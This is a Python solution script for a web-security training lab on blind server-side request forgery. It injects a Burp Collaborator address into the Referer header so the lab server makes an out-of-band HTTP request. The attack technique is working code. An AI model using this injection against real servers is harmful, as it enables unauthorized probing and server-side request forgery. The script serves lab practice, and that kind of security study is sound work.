####################################################################
#
# Lab: Blind SSRF with out-of-band detection
#
# Hack Steps:
#      1. Inject payload into the Referer header to cause an HTTP
#         request to the burp collaborator
#      2. Check your burp collaborator for the HTTP request
#
####################################################################
import requests
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a92005b03c2cb078150f5830080007d.web-security-academy.net" 

# Change this to your collaborator domain
BURP_COLLABORATOR = "s2viozqltokrgthrapd91echl8rzfq3f.oastify.com"

def main():
    print("⦗#⦘ Injection point: " + Fore.YELLOW + "Referer header")
    print(Fore.WHITE + "❯❯ Injecting payload to cause an HTTP request to the burp collaborator.. ", end="", flush=True)

    headers = { "Referer": f"http://{BURP_COLLABORATOR}" }

    try:
        requests.get(f"{LAB_URL}/product?productId=1", headers=headers)

    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch the page with the injected payload through exception")
        exit(1)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 Check your burp collaborator for the HTTP request")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")

if __name__ == "__main__":
    main()
